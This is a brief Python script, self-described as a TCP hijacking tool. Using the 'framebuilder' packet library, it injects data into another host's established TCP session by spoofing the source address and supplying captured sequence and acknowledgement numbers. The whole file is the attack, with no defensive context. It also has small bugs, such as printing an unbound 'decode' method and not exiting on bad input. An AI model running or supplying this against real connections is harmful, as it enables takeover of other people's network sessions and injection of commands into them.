#!/usr/bin/env python3

'''Script for TCP hijacking'''

import time, os, sys, tty, termios
from framebuilder import eth, ipv4, tcp, tools

def getch():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

if len(sys.argv) < 8:
    print('Missing arguments')
    print(f'Usage: {sys.argv[0]} interface local_ip local_port remote_ip remote_port seq_nr ack_nr')
    sys.exit(1)

if not tools.is_valid_ipv4_address(sys.argv[2]):
    print(f'Invalid IP address: {sys.argv[2]}')
    print(f'Usage: {sys.argv[0]} interface local_ip local_port remote_ip remote_port seq_nr ack_nr')
    sys.exit(1)

if not tools.is_valid_ipv4_address(sys.argv[4]):
    print(f'Invalid IP address: {sys.argv[4]}')
    print(f'Usage: {sys.argv[0]} interface local_ip local_port remote_ip remote_port seq_nr ack_nr')
    sys.exit(1)

if_name = sys.argv[1]
local_ip = sys.argv[2]
remote_ip = sys.argv[4]
local_port = 0
remote_port = 0
seq_nr = 0
ack_nr = 0
try:
    local_port = int(sys.argv[3])
    remote_port = int(sys.argv[5])
    seq_nr = int(sys.argv[6])
    ack_nr = int(sys.argv[7])
except ValueError:
    print(f'Invalid port, ack or sequence number')
    print(f'Usage: {sys.argv[0]} interface local_ip local_port remote_ip remote_port seq_nr ack_nr')

tcp_handler = tcp.TCPHandler(if_name, local_port, remote_ip, block=1)
tcp_handler.remote_port = remote_port
tcp_handler.local_ip = local_ip
tcp_handler._rcv_nxt = ack_nr
tcp_handler._snd_nxt = seq_nr
tcp_handler.state = tcp.TCPHandler.ESTABLISHED
try:
    ch = getch()
    tcp_handler.send(ch.encode())
    data = tcp_handler.receive(65535)
    print(data.decode)
except KeyboardInterrupt:
    tcp_handler.close()
